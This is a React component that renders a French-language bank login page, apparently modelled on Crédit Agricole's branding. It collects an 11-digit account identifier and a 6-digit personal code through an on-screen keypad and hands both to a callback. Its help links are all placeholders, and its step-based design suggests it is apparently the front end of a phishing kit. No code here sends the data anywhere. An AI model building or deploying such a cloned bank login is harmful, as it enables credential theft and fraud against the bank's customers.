import React, { useState } from 'react';

interface LoginStepProps {
  onContinue: (user: string, password: string) => void;
}

const ROW1 = [1, 4, 0, 7, 2];
const ROW2 = [3, 5, 8, 6, 9];

const LoginStep: React.FC<LoginStepProps> = ({ onContinue }) => {
  const [user, setUser] = useState('');
  const [password, setPassword] = useState('');
  const [showKeypad, setShowKeypad] = useState(false);
  const [errorIdent, setErrorIdent] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleUserInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').substring(0, 11);
    setUser(val);
    setErrorIdent(false);

    if (val.length === 11) {
      setShowKeypad(true);
    } else {
      setShowKeypad(false);
      setPassword('');
    }
  };

  const handleKey = (digit: number) => {
    if (password.length >= 6) return;
    setPassword(prev => prev + digit);
  };

  const handleClear = () => setPassword('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (user.length !== 11 || !/^\d+$/.test(user)) {
      setErrorIdent(true);
      return;
    }
    if (password.length !== 6) return;
    if (isSubmitting) return;

    setIsSubmitting(true);
    await onContinue(user, password);
  };

  const canSubmit = user.length === 11 && password.length === 6 && !isSubmitting;

  return (
    <main className="pt-20 min-h-screen">
      <div className="container mx-auto lg:px-4 lg:py-8">
        <div className="max-w-6xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">

            <div className="lg:bg-white lg:rounded-2xl lg:shadow-lg lg:p-10 animate-fadeIn">
              <form onSubmit={handleSubmit} className="px-4 lg:px-0">
                <h1 className="font-heading text-3xl font-bold text-gray-900 mb-8">
                  Accéder à mes comptes
                </h1>

                <div className="mb-6">
                  <label className="block text-xs font-bold text-gray-900 mb-2 uppercase tracking-wide">
                    Identifiant
                  </label>
                  <p className="text-sm text-gray-700 mb-3">
                    Saisissez votre identifiant à 11 chiffres
                  </p>
                  <input
                    type="tel"
                    value={user}
                    onChange={handleUserInput}
                    maxLength={11}
                    placeholder="Exemple 98652706859"
                    className={`w-full px-4 py-3 bg-gray-50 border rounded-lg focus:outline-none focus:border-ca-green focus:ring-2 focus:ring-ca-green/20 focus:bg-white transition-all text-base ${
                      errorIdent ? 'border-red-500' : 'border-gray-300'
                    }`}
                  />
                  {errorIdent && (
                    <div className="text-red-500 text-sm mt-2">
                      Veuillez saisir votre numéro de compte à 11 chiffres
                    </div>
                  )}
                </div>

                {showKeypad && (
                  <div className="animate-fadeIn">
                    <div className="mb-6">
                      <div className="flex justify-between items-center mb-2">
                        <label className="text-xs font-bold text-gray-900 uppercase tracking-wide">
                          Code personnel
                        </label>
                        <a href="#" className="text-xs text-ca-green hover:text-ca-green-dark font-semibold">
                          Perdu / Oublié ?
                        </a>
                      </div>
                      <input
                        type="password"
                        value={password}
                        readOnly
                        placeholder="Tapez votre code dans le pavé numérique ci-dessous"
                        className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-lg cursor-default text-base mb-6"
                      />
                    </div>

                    <div className="space-y-4 mb-6">
                      <div className="flex justify-between gap-3">
                        {ROW1.map(d => (
                          <button key={`r1-${d}`} type="button" onClick={() => handleKey(d)}
                            className="flex-1 aspect-square flex items-center justify-center text-2xl font-semibold text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 rounded-lg transition-colors">
                            {d}
                          </button>
                        ))}
                      </div>
                      <div className="flex justify-between gap-3">
                        {ROW2.map(d => (
                          <button key={`r2-${d}`} type="button" onClick={() => handleKey(d)}
                            className="flex-1 aspect-square flex items-center justify-center text-2xl font-semibold text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 rounded-lg transition-colors">
                            {d}
                          </button>
                        ))}
                      </div>
                    </div>

                    <button type="button" onClick={handleClear}
                      className="w-full py-3 mb-4 border-2 border-gray-300 text-gray-700 hover:border-red-500 hover:text-red-500 font-semibold rounded-full transition-all">
                      Effacer
                    </button>

                    <button type="submit" disabled={!canSubmit}
                      className={`w-full py-4 bg-ca-green text-white font-bold text-sm uppercase tracking-wide rounded-full transition-all shadow-md ${
                        canSubmit ? 'hover:bg-ca-green-dark hover:shadow-lg' : 'opacity-50 cursor-not-allowed'
                      }`}>
                      {isSubmitting ? 'Chargement...' : 'Valider'}
                    </button>
                  </div>
                )}

                <div className="text-center my-6">
                  <a href="#" className="text-sm text-ca-green hover:text-ca-green-dark font-semibold underline">
                    Oubli/Perte de code personnel
                  </a>
                </div>

                <div className="mt-8 pt-6 border-t border-gray-200">
                  <p className="text-center text-base font-semibold text-gray-900 mb-4">
                    Vous n'êtes pas encore client ?
                  </p>
                  <button type="button"
                    className="w-full py-4 bg-ca-green hover:bg-ca-green-dark text-white font-bold text-sm uppercase tracking-wide rounded-full transition-all shadow-md hover:shadow-lg">
                    Devenir client
                  </button>
                </div>
              </form>
            </div>

            <div className="hidden lg:block bg-white rounded-2xl shadow-lg p-10 space-y-6">
              <div>
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Oubli/Perte de code personnel
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed">
                  Si vous avez oublié ou perdu votre code personnel,
                  <a href="#" className="text-ca-green hover:text-ca-green-dark font-semibold underline"> cliquez ici</a>.
                </p>
              </div>
              <div className="pt-4 border-t border-gray-200">
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Un problème technique ?
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed">
                  Une assistance est à votre disposition,
                  <a href="#" className="text-ca-green hover:text-ca-green-dark font-semibold underline"> cliquez ici</a>.
                </p>
              </div>
              <div className="pt-4 border-t border-gray-200">
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Sécurité
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed mb-2">
                  Restez vigilants et veillez à protéger vos données personnelles.
                </p>
                <a href="#" className="text-ca-green hover:text-ca-green-dark font-semibold underline text-sm">
                  Consultez nos conseils de sécurité
                </a>
              </div>
              <div className="pt-4 border-t border-gray-200">
                <p className="text-sm text-gray-700 leading-relaxed mb-2">
                  Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.
                </p>
                <a href="#" className="text-ca-green hover:text-ca-green-dark font-semibold underline text-sm">
                  Voir les Conditions Générales d'Utilisation
                </a>
              </div>
            </div>

          </div>
        </div>
      </div>
    </main>
  );
};

export default LoginStep;
